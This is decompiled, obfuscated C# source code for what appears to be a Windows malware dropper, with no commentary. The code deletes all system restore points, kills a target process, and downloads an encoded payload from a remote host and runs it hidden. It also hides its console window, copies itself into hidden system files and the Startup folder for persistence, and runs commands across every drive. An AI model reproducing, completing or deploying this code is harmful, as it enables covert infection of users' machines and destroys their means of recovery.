#define TRACE
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;

namespace C3904355907;

internal class C3187964512
{
	private delegate void C3554254475();

	private delegate void C3904355907(string string_0);

	private static string[] m_C3554254475 = new string[2]
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JK(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jk()
	};

	public static void C3554254475()
	{
		try
		{
			string text = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iT();
			string[] array = new string[1] { text };
			string[] array2 = array;
			foreach (string processName in array2)
			{
				Process[] processesByName = Process.GetProcessesByName(processName);
				foreach (Process process in processesByName)
				{
					process.Kill();
				}
			}
		}
		catch (Exception)
		{
		}
	}

	[DllImport("Srclient.dll")]
	private static extern int SRRemoveRestorePoint(int int_0);

	public static void C3904355907()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.it(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iU(), new ObjectGetOptions());
		ManagementObjectCollection instances = val.GetInstances();
		StringBuilder stringBuilder = new StringBuilder();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				stringBuilder.AppendLine((string)current.get_Item(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iu()) + Convert.ToChar(9) + (uint)current.get_Item(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iV()));
				SRRemoveRestorePoint(int.Parse(current.get_Item(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iV()).ToString()));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void C1255198513()
	{
		byte[] bytes = Convert.FromBase64String(new WebClient().DownloadString(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iv()));
		string text = Environment.ExpandEnvironmentVariables(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iW()) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Bh() + C3904355907(20) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iS();
		File.WriteAllBytes(text, bytes);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.FileName = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.id();
		processStartInfo.Arguments = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iw() + text;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
	}

	private static void C3554254475(string[] args)
	{
		try
		{
			C3554254475(bool_0: true);
			if (C1037565863())
			{
				ThreadPool.QueueUserWorkItem(C3554254475, DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iX());
			}
			else if (C1342839628.C3554254475())
			{
				C1255198513();
				C3554254475();
				C2746444292();
				C3904355907();
				string location = Assembly.GetEntryAssembly()!.Location;
				byte[] byte_ = File.ReadAllBytes(location);
				string text = C3904355907(10);
				C3554254475(Environment.ExpandEnvironmentVariables(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iW()) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Bh() + text + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ix(), byte_);
				C4067256894.C1255198513(1, C3187964512.m_C3554254475[0], C3187964512.m_C3554254475[1], Environment.ExpandEnvironmentVariables(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iW()) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Bh() + text + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ix());
				C3554254475(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Bh() + C3904355907(10) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ix(), byte_);
				C3554254475(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iY(), DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iy());
				ThreadPool.QueueUserWorkItem(C3554254475, DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iX());
			}
			else
			{
				Process.GetCurrentProcess().Kill();
			}
		}
		catch (Exception)
		{
			ThreadPool.QueueUserWorkItem(C3554254475, DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iX());
		}
		Console.ReadLine();
	}

	private static void C3554254475(bool bool_0)
	{
		IntPtr consoleWindow = C453955339.GetConsoleWindow();
		if (bool_0)
		{
			C453955339.ShowWindow(consoleWindow, 0);
		}
		else
		{
			C453955339.ShowWindow(consoleWindow, 5);
		}
	}

	public static bool C1908338681()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void C3554254475(string string_0, byte[] byte_0)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				File.WriteAllBytes(string_0, byte_0);
				File.SetAttributes(string_0, FileAttributes.Hidden | FileAttributes.System);
			}
		}
		catch
		{
		}
	}

	private static void C3554254475(string string_0, string string_1)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				File.WriteAllText(string_0, string_1);
				File.SetAttributes(string_0, FileAttributes.Hidden | FileAttributes.System);
			}
		}
		catch
		{
		}
	}

	public static string C3904355907(int int_0)
	{
		Random random = new Random();
		string[] array = new string[22]
		{
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.BU(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cP(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.dm(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.dP(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iZ(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iz(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JA(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Ja(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JB(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cq(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JB(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jb(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JC(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jc(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JD(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.C453955339(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jd(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JE(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Je(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.C1801730948(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JF(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jf()
		};
		string[] array2 = new string[7]
		{
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.C1505515367(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Dm(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JG(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jg(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JH(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jh(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JI()
		};
		string text = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz();
		text += array[random.Next(array.Length)].ToUpper();
		text += array2[random.Next(array2.Length)];
		int num;
		for (num = 2; num < int_0; num++)
		{
			text += array[random.Next(array.Length)];
			num++;
			text += array2[random.Next(array2.Length)];
		}
		return text;
	}

	public static bool C1037565863()
	{
		return C4067256894.C3554254475(1, C3187964512.m_C3554254475[0], C3187964512.m_C3554254475[1]);
	}

	public void C112844655()
	{
	}

	public static void C2746444292()
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		string string_ = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Ji();
		string[] array = new string[2]
		{
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JJ(),
			DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jj()
		};
		C4067256894.C3904355907(string_);
		string[] array2 = logicalDrives;
		foreach (string text in array2)
		{
			char c = text[0];
			C4067256894.C3904355907(string.Format(array[0], c, c));
			C4067256894.C3904355907(string.Format(array[1], c, c));
		}
		C4067256894.C3904355907(string_);
	}

	private static async void C3554254475(object object_0)
	{
		string text = (C1801730948.C3904355907 = C252678980.C3554254475());
		C1801730948.C1037565863();
		Task<C655174618> task = new C1801730948(text).C1908338681();
		try
		{
			if (task.Result.C3904355907() != DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz())
			{
				C3463352047.C3554254475 = C3463352047.C3554254475(task.Result.C3904355907(), C3463352047.C3554254475(task.Result.C1255198513(), text));
			}
		}
		catch
		{
		}
		Trace.WriteLine(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.KT() + text);
		C3463352047.C3904355907();
		ThreadStart start = ((!DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iX().Equals(object_0)) ? new ThreadStart(C3568589458) : new ThreadStart(C2564639436));
		Thread thread = new Thread(start);
		thread.Priority = ThreadPriority.BelowNormal;
		thread.IsBackground = true;
		thread.Start();
		thread.Join();
		if (!DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.iX().Equals(object_0))
		{
		}
		Console.ReadLine();
	}

	private static void C2564639436()
	{
		C1812594589 c = new C1812594589();
		c.C3554254475();
	}

	private static void C3568589458()
	{
		C4110462503 c4110462503 = new C4110462503();
		c4110462503.C3554254475();
	}
}
